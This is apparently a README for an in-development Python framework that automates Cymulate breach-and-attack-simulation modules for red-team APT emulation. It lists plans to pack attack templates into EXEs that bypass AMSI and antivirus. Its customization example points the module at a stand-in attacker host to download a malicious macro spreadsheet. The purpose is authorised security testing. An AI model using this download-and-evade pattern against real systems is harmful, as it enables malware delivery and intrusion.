- **Notice**: This project is still under development and not ready for production use.

## Introduction

The framework to automate Cymulate's modules and templates.

**What is Cymulate?**

> [Cymualte](https://cymulate.com/) is a BAS (Break and Attack Simulation) platform that provides a comprehensive set of attack simulations based on the **MITRE ATT&CKÂ® framework** to test the effectiveness of your security controls.

This project is aimed to help red team construct fully customizable and automated APT attacks easily.

## Functionality

- [ ] Scrape modules and templates from Cymulate and transform them into scripts.
- [ ] Automate the execution of templates such as APT, Phishing, etc.
- [ ] Generate standalone EXE for templates and bypass AMSI, Antivirus

## Usage

### Installation

Make sure `python 3.11+` and `poetry` are installed:

- **Python** - https://www.python.org/downloads/
- **Poetry** - `pip install poetry`

Install required python packages:

```powershell
poetry install
```

### Run

Batch Scripts:

- `client_start.bat` - Reset and update to the latest version of the framework then run `main.py`

## How it works

Cymulate's execution module have 5 main steps:

1. **Check dependency** - Check if required dependencies are installed.
2. **Execution** -Run the mitre ATT&CK technique execution.
3. **Success Indicate** - Check if the attack was successful via parsing execution output or check exit code.
4. **Output Parsing** - Parse the output of the execution for further uses.
5. **Cleanup** - Clean up the execution environment.

The framework will automate the execution of the above steps.

## Customization

We can pass self defined parameters to the execution module like this:

```python
# Import windows module from core
from core.module.windows import WindowsModule

# Create a windows module instance
execution = WindowsModule("62385f03a0e69ed2274622cc", debug=True)
# Update the input arguments to your own ones
execution.input_arguments.update({
    "download_file_url": "https://attacker.com/very_dangerous_excel.xlsx",
    "download_file_path": "$env:temp\Income.xlsm",
})
# Execute the module after initialization
execution.run()
```

## Development

### Environment

- Python 3.11+
- Poetry

### Setup

```powershell
# Install dependencies
poetry install

# Activate the virtual environment
poetry shell
```

### Blueprint

- `Basic structure` - The basic structure of the project.
- `APT template` - APT template automation test.
- `Scrape modules and templates` - Scrape modules and templates via Cymulate's [API](https://api.app.cymulate.com/docs/#/)
- `Transform modules and templates` - Transform modules and templates into cymulate-framework modules.
- `Automate execution` - Automate the execution of templates.
- `APT Script generator` - Generate scripts for APT template with extracted specific execution scripts (don't wanna load the 20+mb json file) and load corresponding required 3rd party pip packages into scripts
- `Pack Script to EXE` - Pack generated template script with its requirements(pip packages, execution scripts) into EXE via `pyisntaller`, `py2exe` or `Nuitka`
- `ClI` - A CLI to interact with the framework.

### Notes

- Using `builtin dataclass` + `dacite` for JSON deserializing model instead of `pydantic` since `dacite` is enough for the purpose.
